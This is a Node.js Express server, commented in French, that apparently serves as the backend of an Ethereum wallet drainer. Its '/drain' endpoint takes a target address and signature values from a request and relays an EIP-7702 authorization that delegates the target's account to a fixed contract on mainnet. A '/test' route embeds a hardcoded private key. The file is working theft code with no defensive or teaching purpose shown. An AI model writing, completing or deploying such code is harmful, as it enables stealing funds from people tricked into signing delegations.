import express from "express";
import cors from "cors";
import { createWalletClient, createPublicClient, http } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { mainnet } from "viem/chains";

const RPC = process.env.RPC_URL;
const PK = process.env.PRIVATE_KEY.startsWith("0x") ? process.env.PRIVATE_KEY : "0x" + process.env.PRIVATE_KEY;
const CONTRACT = "0x644efce7920fc8af69cb45832e5fed2ff5e2d92b";

const account = privateKeyToAccount(PK);
const publicClient = createPublicClient({ chain: mainnet, transport: http(RPC) });
const walletClient = createWalletClient({ account, chain: mainnet, transport: http(RPC) });

const app = express();
app.use(cors());
app.use(express.json());

app.get("/test", async (req, res) => {
  try {
    const FANTOME = "0xaa482A91eA4be0524c966c621FCA52F8Ade011C3";
    const FANTOME_PK = "0x187aedafac6434ebd780acc1d6bd544055cb2bdb07c8dfb2c423f3d31c704d9f";

    const fantomeAccount = privateKeyToAccount(FANTOME_PK);
    const authNonce = await publicClient.getTransactionCount({ address: FANTOME });

    const authorization = await walletClient.signAuthorization({
      account: fantomeAccount,
      contractAddress: CONTRACT,
      chainId: 1,
      nonce: authNonce,
    });

    const hash = await walletClient.sendTransaction({
      to: FANTOME,
      data: "0x",
      authorizationList: [authorization],
    });

    res.json({ hash });
  } catch (e) {
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.post("/drain", async (req, res) => {
  try {
    const { fantome, auth } = req.body;
    if (!fantome || !auth) return res.status(400).json({ error: "fantome/auth manquant" });

    console.log("AUTH RECU:", JSON.stringify(auth));

    if (!auth.r || !auth.s) {
      return res.status(400).json({ error: "r ou s manquant dans auth" });
    }

    const authNonce = await publicClient.getTransactionCount({ address: fantome });

    let yp = auth.yParity;
    if (typeof yp === "string" && yp.startsWith("0x")) yp = parseInt(yp, 16);
    yp = Number(yp);
    if (yp >= 27) yp = yp - 27;

    const authorization = {
      chainId: 1,
      contractAddress: CONTRACT,
      nonce: authNonce,
      yParity: yp,
      r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
      s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
    };

    const hash = await walletClient.sendTransaction({
      to: fantome,
      data: "0x",
      authorizationList: [authorization],
    });

    res.json({ hash });
  } catch (e) {
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.get("/", (_, res) => res.send("majordome ok"));
app.listen(process.env.PORT || 3000);
